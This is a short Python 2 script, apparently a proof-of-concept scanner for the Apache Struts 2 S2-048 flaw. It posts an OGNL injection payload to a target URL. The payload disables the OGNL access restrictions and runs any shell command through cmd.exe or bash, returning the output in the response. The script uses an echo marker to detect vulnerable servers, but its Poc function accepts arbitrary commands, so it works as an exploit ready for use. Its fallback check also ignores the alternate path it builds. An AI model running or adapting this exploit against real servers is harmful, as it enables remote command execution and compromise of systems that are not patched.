#!/usr/bin/python  
#coding=utf-8  

'''
s2-048 poc
'''
import sys,os
import requests
import urllib  
import urllib2  
  
def Poc(url,command):
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    poc = {"name":"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}","age":"1","__checkbox_bustedBefore":"true","description":"123123"}
    data = urllib.urlencode(poc)
    try:
        result = requests.post(url,data=data,headers=header)
        if result.status_code == 200:
            return str(result.content)
    except requests.ConnectionError,e:
	pass
#	socket.timeout,
#        requests.exceptions.TooManyRedirects,
#        requests.exceptions.ConnectTimeout,
#        requests.exceptions.ConnectionError,
#        requests.exceptions.ReadTimeout,
#        TimeoutError,
#        ConnectionResetError,
#        socket.gaierror

        #print str(e)
    
def s2_048(url):
    posturl = url
    res = Poc(url, 'echo s2-048-EXISTS')
    if res and 's2-048-EXISTS' in res:
        #print("False;False;000")
        print("True;True;000")
        #print posturl, 's2-048 EXISTS'
    else:
    	posturl = url + "/integration/saveGangster.action"
    	res = Poc(url, 'echo s2-048-EXISTS')
    	if res and 's2-048-EXISTS' in res:
            print("True;True;000")
 	    #print posturl, 's2-048 EXISTS'
    	else:
    	    print("False;False;000")


def scan(url):
    s2_048(url)


if __name__ == '__main__':  
    scan(sys.argv[1])
